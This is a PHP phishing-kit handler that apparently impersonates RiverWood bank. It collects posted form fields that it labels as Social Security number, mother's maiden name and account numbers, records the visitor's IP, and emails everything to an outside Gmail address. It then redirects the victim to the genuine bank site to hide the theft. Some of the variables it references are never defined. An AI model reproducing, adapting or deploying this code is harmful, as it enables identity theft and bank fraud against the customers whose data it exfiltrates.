<?
$lastName1 = $_POST['lastName1'];
$lastName2 = $_POST['lastName2'];
$lastName3 = $_POST['lastName3'];

$ip = getenv("REMOTE_ADDR");

//sending email info here
	$subj = "Info From Erl: $ip";
	$msg = "----------------------------RiverWood bank 2-----------------------------\n Socialsn: $lastName1\n MMN: $lastName2\n Acno1: $lastName3\n Acno2: $lastName4\n MM: $lastName5\n DD: $lastName6\n Confirm YYYY: $lastName7\n ------------------\nip: $ip";
	$from = "From: Erl<infos@Erl.com>";
	mail("stvhoward8@gmail.com", $subj, $msg, $from);
	mail("$cc", $subj, $msg, $from);
	header( "Location: https://www.riverwoodbank.com/speedbump.aspx?link=http://www.riverwoodfinancial.com/");

?>

